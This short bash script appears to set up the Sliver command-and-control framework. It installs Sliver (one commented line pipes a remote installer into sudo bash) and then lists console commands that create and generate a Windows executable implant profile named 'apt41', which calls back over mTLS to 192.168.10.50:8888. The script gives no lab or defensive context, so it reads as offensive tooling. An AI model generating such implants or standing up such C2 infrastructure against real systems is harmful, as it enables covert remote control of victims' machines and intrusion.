#!/bin/bash

apt update
#curl https://sliver.sh/install | sudo bash
apt install sliver


sliver-server
update
armory
profiles new --mtls 192.168.10.50:8888 -f exe apt41
profiles generate apt41
